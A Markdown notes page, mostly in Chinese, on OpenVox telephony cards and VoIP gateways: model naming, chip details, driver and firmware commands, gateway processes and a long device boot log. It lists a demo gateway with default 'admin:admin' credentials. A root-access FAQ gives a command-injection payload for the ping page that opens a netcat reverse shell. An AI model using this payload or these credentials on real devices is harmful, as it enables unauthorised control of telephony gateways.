---
id: openvox
title: OpenVox
---

# OpenVox

* [OpenVox](http://www.openvox.cn/cn/)
* https://openvox.cn/pub/
* 型号格式
  * D - Digit, B - BRI, X - 混合, G - GSM, A - Analog, V - 编码转换卡, TAP - 录音卡, WCD - G 卡的 WCDMA 扩展模块
  * E - 回声消除
  * 数字 路数 1,2,4,8,24
  * 版本 10/30, 30 是 10 的升级
  * P - PCI, E - PCIE
* 210 vs 230
  * 230 has a longer wake width wise in the and not as steep; and the 210 has a steep shorter wake
  * The D230E/DE230E is an upgrade product of the D210E/DE210E.
* [D230E/DE230E on DAHDI User Manual](https://openvoxwiki.atlassian.net/wiki/spaces/UM/pages/917549/D230E+DE230E+on+DAHDI+User+Manual)
* http://www.openvox.cn/pub/
  * 公共文档
  * [D130/D230/D430 Series PRI Card_Datasheet](http://www.openvox.cn/pub/datasheets/English/D130_D230_D430_Series_PRI_Card_Datasheet.pdf)
* `cat /proc/interrupts`
  * 查看是否有独立中断
* 单机多卡需要时钟线
* A 卡都是附加 FXO-400, FSO-400
* D230E
  * [infineon](https://www.infineon.com/)
    * PEF 22554 HT v2.1
    * QuadFALC
    * G0624
    * Framer and LIU (Line Interface Unit) Component (FALC)
    * [Infineon Introduces 4-Line T1/E1/J1 Framer and LIU Component with Smallest Footprint and Lowest Power Consumption](https://www.infineon.com/cms/en/about-infineon/press/market-news/2002/129029.html)
  * 4x MNOVR MS1442 1443Y
  * AITRA cyclone IV
    * [Altera Cyclone® IV](https://www.altera.com.cn/products/fpga/cyclone-series/cyclone-iv/overview.html)
    * EP4CE10E17CBN
    * MALAYSIA
* 驱动下载 - https://openvox.cn/pub/drivers/dahdi-linux-complete/
* 演示网关
  * http://demo.openvox.cn:65327/
  * admin:admin

## 产品命名
* VS - VoxStack
  * 模块化系列网关
  * 支持热插拔
* AG - Analog Gateway - 模拟网关
* DGW - 数字网关
* SWG - 无线网关
* GWM - Gateway Module - 网关模块

* GWM801O - 8口 FXO 模块
* GWM420L - 4口 LTE 模块

## A810

* Communication controller: OpenVox Communication Co. Ltd. Device 0810 (rev 15)
* OpenVOX电话模拟语音卡 A810E Asterisk 卡8路语音卡FXO/FXS模块化 A810E
* AE810E/AE810P [手册](https://openvox.cn/pub/misc/AE810E_AE810P_Elastix%202.0.4_User_Manual_English.pdf)

```bash
modprobe –r opvxa24xx
```

## 固件
* https://www.openvox.cn/pub/firmwares

```bash
# 升级流程
auto_update -i 1
auto_update -b u-boot.bin
auto_update -u -f AnalogGateway.img
```

## VS-AGU-E2M0800
VoxStack 系列 模拟网关。

* 进程
  * /bin/php /my_tools/keeper
  * /bin/php /my_tools/logfile_monitor
  * /my_tools/astmanproxy
  * /my_tools/checkasteriskstat
  * /my_tools/resetkey
  * /my_tools/sys_restore
  * /my_tools/watchdog
  * /webservice/service
  * lighttpd -f /etc/lighttpd.conf -m /usr/lib/lighttpd
    * `/service` -> php-cgi
  * SSH dropbear 12345
  * asterisk -g



## CPU

## FAQ
### 获取 root 权限
1. ssh 用户名修改为 super 即可
2. ping 页面进行 shell 注入
  * `google.com;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2>&1|nc yourip 1234 >/tmp/f`



内置 busybox

Initializing cgroup subsys cpuset
Initializing cgroup subsys cpu
Linux version 2.6.33.5 (root@Jason.openvox) (gcc version 4.1.2) #4 Tue Aug 29 20:38:01 CST 2017
CPU: ARMv6-compatible processor [4117b365] revision 5 (ARMv6TEJ), cr=00c5387d
CPU: VIPT aliasing data cache, VIPT aliasing instruction cache
Machine: Comcerto 1000 (EVM)
Memory policy: ECC disabled, Data cache writeback
On node 0 totalpages: 30720
free_area_init_node: node 0, pgdat c0349584, node_mem_map c0371000
  DMA zone: 240 pages used for memmap
  DMA zone: 0 pages reserved
  DMA zone: 30480 pages, LIFO batch:7
Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 30480
Kernel command line: init=/etc/preinit ubi.mtd=4,2048 ubi.block=0,0 root=/dev/ubiblk0_0 ro rootfstype=squashfs hwaddress=eth0,a0:98:05:0e:04:8e hwaddress=eth2,00:03:7F:0B:00:01 console=ttyS0,115200 mtdparts=comcertonand:256k(uboot),128k(env),128K(param),4M(kernel),20M(root),4M(ekernel),20M(eroot),16M(config),-(system) partno=M83263G fppmode=1
PID hash table entries: 512 (order: -1, 2048 bytes)
Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
allocated 614400 bytes of page_cgroup
please try 'cgroup_disable=memory' option if you don't want memory cgroups
Memory: 120MB = 120MB total
Memory: 117532KB available (3104K code, 263K data, 120K init, 0K highmem)
Hierarchical RCU implementation.
RCU-based detection of stalled CPUs is enabled.
NR_IRQS:80
Calibrating delay loop... 648.80 BogoMIPS (lpj=3244032)
Mount-cache hash table entries: 512
Initializing cgroup subsys debug
Initializing cgroup subsys ns
Initializing cgroup subsys cpuacct
Initializing cgroup subsys memory
Initializing cgroup subsys devices
Initializing cgroup subsys freezer
Initializing cgroup subsys net_cls
CPU: Testing write buffer coherency: ok
NET: Registered protocol family 16
force gpio 9 and 28 to 1

end of process
SPI core: loaded version 0.2
PCIe0: no device detected on link (3)
PCIe1: no device detected on link (3)
pcie_setup(0)
pcie_scan_bus(0)
PCI: bus0: Fast back to back transfers enabled
pcie_setup(1)
pcie_scan_bus(1)
PCI: bus1: Fast back to back transfers enabled
bio: create slab <bio-0> at 0
Switching to clocksource timer3
NET: Registered protocol family 2
IP route cache hash table entries: 1024 (order: 0, 4096 bytes)
TCP established hash table entries: 4096 (order: 3, 32768 bytes)
TCP bind hash table entries: 4096 (order: 2, 16384 bytes)
TCP: Hash tables configured (established 4096 bind 4096)
TCP reno registered
UDP hash table entries: 256 (order: 0, 4096 bytes)
UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)
NET: Registered protocol family 1
RPC: Registered udp transport module.
RPC: Registered tcp transport module.
RPC: Registered tcp NFSv4.1 backchannel transport module.
PCI: CLS 0 bytes, default 32
SPI core: add adapter comcerto-spi
arm1: Module loaded.
membuf_init: created membuf device(254, 0)
squashfs: version 4.0 (2009/01/31) Phillip Lougher
Registering mini_fo version $Id: 209-mini_fo.patch,v 1.1 2010/06/21 08:55:23 satananda.burla Exp $
JFFS2 version 2.2 (NAND) (SUMMARY) (ZLIB) (RTIME) (c) 2001-2006 Red Hat, Inc.
msgmni has been set to 229
Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)
io scheduler noop registered (default)
Serial: 8250/16550 driver, 2 ports, IRQ sharing disabled
serial8250.0: ttyS0 at MMIO 0x10090000 (irq = 41) is a 16550A
console [ttyS0] enabled
serial8250.0: ttyS1 at MMIO 0x10094000 (irq = 58) is a 16550A
brd: module loaded
loop: module loaded
nbd: registered device at major 43
NAND device: Manufacturer ID: 0x01, Chip ID: 0xf1 (AMD NAND 128MiB 3,3V 8-bit)
Scanning device for bad blocks
9 cmdlinepart partitions found on MTD device comcertonand
Creating 9 MTD partitions on "comcertonand":
0x000000000000-0x000000040000 : "uboot"
0x000000040000-0x000000060000 : "env"
0x000000060000-0x000000080000 : "param"
0x000000080000-0x000000480000 : "kernel"
0x000000480000-0x000001880000 : "root"
0x000001880000-0x000001c80000 : "ekernel"
0x000001c80000-0x000003080000 : "eroot"
0x000003080000-0x000004080000 : "config"
0x000004080000-0x000008000000 : "system"
UBI: attaching mtd4 to ubi0
UBI: physical eraseblock size:   131072 bytes (128 KiB)
UBI: logical eraseblock size:    126976 bytes
UBI: smallest flash I/O unit:    2048
UBI: sub-page size:              512
UBI: VID header offset:          2048 (aligned 2048)
UBI: data offset:                4096
UBI: attached mtd4 to ubi0
UBI: MTD device name:            "root"
UBI: MTD device size:            20 MiB
UBI: number of good PEBs:        160
UBI: number of bad PEBs:         0
UBI: max. allowed volumes:       128
UBI: wear-leveling threshold:    4096
UBI: number of internal volumes: 1
UBI: number of user volumes:     1
UBI: available PEBs:             13
UBI: total number of reserved PEBs: 147
UBI: number of PEBs reserved for bad PEB handling: 2
UBI: max/mean erase counter: 1/0
UBI: image sequence number: 217018524
UBIBLK starting
UBIBLK: device's major: 254
Got volume rootfs: device 0/volume 0 of size 141
UBI: background thread "ubi_bgt0d" started, PID 260
c1k_eth_probe: gemac 0
eth0: C1000 Ethernet Controller a0:98:05:0e:04:8e
c1k_eth_probe: gemac 1
eth2: C1000 Ethernet Controller 00:03:7f:0b:00:01
Comcerto MDIO Bus: probed
Comcerto MDIO Bus: probed
eth1 probe pdev= c0332558
PPP generic driver version 2.4.2
PPP Deflate Compression module registered
PPP BSD Compression module registered
PPP MPPE Compression module registered
NET: Registered protocol family 24
PPPoL2TP kernel driver, V1.0
tun: Universal TUN/TAP device driver, 1.6
tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
comcerto_wdt: support registered
cpuidle: using governor ladder
IPv4 over IPv4 tunneling driver
GRE over IPv4 tunneling driver
TCP cubic registered
Initializing XFRM netlink socket
NET: Registered protocol family 10
lo: Disabled Privacy Extensions
tunl0: Disabled Privacy Extensions
IPv6 over IPv4 tunneling driver
sit0: Disabled Privacy Extensions
ip6tnl0: Disabled Privacy Extensions
NET: Registered protocol family 17
NET: Registered protocol family 15
Initializing NETLINK_KEY socket
Bridge firewalling registered
802.1Q VLAN Support v1.8 Ben Greear <greearb@candelatech.com>
All bugs added by David S. Miller <davem@redhat.com>
VFS: Mounted root (squashfs filesystem) readonly on device 254:0.
Freeing init memory: 120K
Please be patient, while OpenWrt loads ...
jffs2_scan_inode_node(): CRC failed on node at 0x000627e4: Read 0xffffffff, calculated 0xa569b143
load led key driver sucess
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
c1k_eth_open: eth0
Disabling GEM0 delay
comcerto gemac0 software config using MII
PHY start: 0:00
PHY: 0:00 - Link is Up - 100/Full
eth0: no IPv6 routers present
comcerto-ved comcerto-ved: firmware: requesting msp.axf
MSP is running
drivers/net/comcerto/comcerto_ved.c: 459: info
	Device=170
	Revision=0
	spu_version=Arm11DspV_5_6_9
	CSPtoMSPQueuePhyaddr=a000500
	MSPtoCSPQueuePhyaddr=a000510
	SMRXCSPhyaddr=a000520
	SMTXCSPhyaddr=a000520

MSP version is : mspvoip_v6_01_3
NET: Registered protocol family 27
krtpd installed
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0!!
i is 0
i is 0
i is 8
i is 8
i is 0
i is 0
i is 0
i is 0
Dahdi UDP init success
dahdi: Telephony Interface Registered on major 196
dahdi: Version: 2.6.0
dcra: version 0.1.0 loaded
SPI core: add driver wctdmc1k
SPI core: attach client to adapter comcerto-spi
eth1: no IPv6 routers present
INFO: RCU detected CPU 0 stall (t=1000 jiffies)
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
listent asterisk: [get_asterisk_event] Invalid channo=0
dcra: channel 0 registered
dcra: channel 1 registered
dcra: channel 2 registered
dcra: channel 3 registered
dcra: channel 4 registered
dcra: channel 5 registered
dcra: channel 6 registered
dcra: channel 7 registered
wctdmc1k: Module 0 Installed -- AUTO FXS/DPO
wctdmc1k: Module 1 Installed -- AUTO FXS/DPO
wctdmc1k: Module 2 Installed -- AUTO FXS/DPO
wctdmc1k: Module 3 Installed -- AUTO FXS/DPO
wctdmc1k: Module 4 Installed -- AUTO FXS/DPO
wctdmc1k: Module 5 Installed -- AUTO FXS/DPO
wctdmc1k: Module 6 Installed -- AUTO FXS/DPO
wctdmc1k: Module 7 Installed -- AUTO FXS/DPO
wctdmc1k: Found a Wildcard TDM: wctdmc1k (8 modules)
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 1  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 2  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 3  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 4  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 5  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 6  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 7  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
chan 8  LSTAST_TXSIG_ONHOOK
first led_key_read reboot_count0
device eth0 entered promiscuous mode
